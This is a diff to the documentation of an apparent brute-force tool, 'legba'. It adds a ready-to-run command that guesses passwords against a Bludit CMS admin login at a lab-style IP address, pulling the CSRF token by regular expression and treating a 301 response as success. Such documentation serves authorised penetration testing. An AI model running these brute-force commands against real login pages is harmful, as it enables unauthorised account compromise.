@@ -254,10 +254,24 @@ legba http \
     --username admin \
     --password wordlists/passwords.txt \
     --target http://localhost:8888/ \
-    --http-csrf-page http://localhost:8888/ \ # where to grab the CSRF token from, or empty if it's the same as --target
+    --http-csrf-page http://localhost:8888/ \ # where to grab the CSRF token from
     --http-csrf-regexp '<input type="hidden" name="([^\"]+)" value="([^\"]+)"' \ # regular expression to extract it
     --http-method POST \
     --http-payload 'user={USERNAME}&pass={PASSWORD}'
+```
+
+Practical example for the Bludit CMS:
+
+```sh
+legba http \
+    --username admin \
+    --password /path/to/your/wordlist.txt \
+    -T http://10.10.10.191/admin/ \
+    --http-csrf-page http://10.10.10.191/admin/ \
+    --http-csrf-regexp 'id="jstokenCSRF" name="([^\"]+)" value="([^\"]+)"' \
+    --http-method POST \
+    --http-payload 'username={USERNAME}&password={PASSWORD}' \
+    --http-success 'status == 301'
 ```
 
 Targeting an example Microsoft Exchange server via OWA:
